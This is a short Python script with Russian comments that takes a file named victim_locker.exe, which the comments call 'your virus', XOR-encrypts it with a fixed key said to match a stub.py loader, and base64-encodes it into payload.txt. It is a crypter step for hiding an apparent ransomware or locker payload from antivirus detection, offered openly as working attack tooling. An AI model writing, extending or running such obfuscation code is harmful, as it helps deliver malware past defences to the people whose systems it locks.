import base64

# Читаем твой вирус
with open("victim_locker.exe", "rb") as f:
    data = f.read()

# Шифруем простым XOR (тот же ключ, что в stub.py)
key = 0xAA
encrypted = bytes([b ^ key for b in data])

# Переводим в Base64 и сохраняем как текстовый файл
with open("payload.txt", "wb") as f:
    f.write(base64.b64encode(encrypted))

print("Файл payload.txt создан!")
